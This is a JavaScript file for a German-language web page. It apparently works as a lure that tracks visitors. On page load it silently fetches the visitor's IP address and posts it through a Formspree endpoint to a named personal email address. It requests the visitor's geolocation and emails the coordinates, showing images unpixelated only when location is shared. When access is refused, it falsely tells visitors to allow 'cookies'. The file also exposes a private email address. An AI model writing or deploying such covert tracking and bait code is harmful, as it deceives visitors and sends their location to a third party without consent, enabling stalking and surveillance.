document.addEventListener("DOMContentLoaded", function() {
    sendIpAddress(); // IP-Adresse beim Laden der Seite senden
});

document.getElementById('trackBtn').addEventListener('click', function() {
    getLocation();
    showNewImages(false); // Zeigt verpixelte Bilder an, auch bei Fehlern
});

// 📍 Standort abrufen
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => sendLocationByEmail(position),
            error => {
                showError(error);
                showNewImages(false); // Bei Fehlern trotzdem verpixelte Bilder anzeigen
            }
        );
    } else {
        updateStatus("Anfrage wird von diesem Browser nicht unterstützt.");
        showNewImages(false);
    }
}

// 📍 Standort per E-Mail senden
function sendLocationByEmail(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;

    sendToFormspree("Standortdaten", locationData);
    showNewImages(true); // Entferne Verpixelung nach erfolgreicher Standortermittlung
}

// 🌍 IP-Adresse ermitteln und senden
function sendIpAddress() {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipMessage = `IP-Adresse des Besuchers: ${data.ip}`;
            sendToFormspree("Neue Besucher-IP", ipMessage);
        })
        .catch(error => console.error("Fehler beim Abrufen der IP-Adresse:", error));
}

// 📧 Funktion zum Versenden von E-Mails über Formspree
function sendToFormspree(subject, message) {
    fetch("https://formspree.io/f/mpwplqao", {
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            email: "nejat.balta@outlook.de",
            subject: subject,
            message: message
        })
    })
    .then(response => {
        if (response.ok) {
            console.log(subject + " erfolgreich gesendet");
        } else {
            console.error("Fehler beim Senden:", response);
        }
    })
    .catch(error => console.error("Fehler beim Senden an Formspree:", error));
}

// 🔴 Fehlerbehandlung für Standortabruf
function showError(error) {
    updateStatus("Bitte laden Sie die Seite neu und erlauben Sie den Zugriff auf Cookies, um die Fotos und Videos anzusehen.");
}

// 📌 Fehlermeldung anzeigen
function updateStatus(message) {
    document.getElementById("status").innerHTML = message;
}

// 🖼️ Bilder anzeigen (verpixelt oder klar)
function showNewImages(removePixelation) {
    const imageContainer = document.getElementById("additional-images");

    // Verhindert doppeltes Einfügen von Bildern
    if (imageContainer.children.length > 0) {
        if (removePixelation) {
            // Entferne Verpixelung der Bilder
            document.querySelectorAll('#additional-images img').forEach(img => img.classList.remove('pixelated'));
        }
        return;
    }

    // Beispielbilder
    const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];

    newImages.forEach(imageSrc => {
        const imgElement = document.createElement("img");
        imgElement.src = imageSrc;
        imgElement.alt = "Weitere Bilder";
        
        // Wenn kein Standort ermittelt wurde, verpixele die Bilder
        if (!removePixelation) {
            imgElement.classList.add('pixelated'); 
        }

        imageContainer.appendChild(imgElement);
    });

    document.getElementById("message").style.display = "block";
}
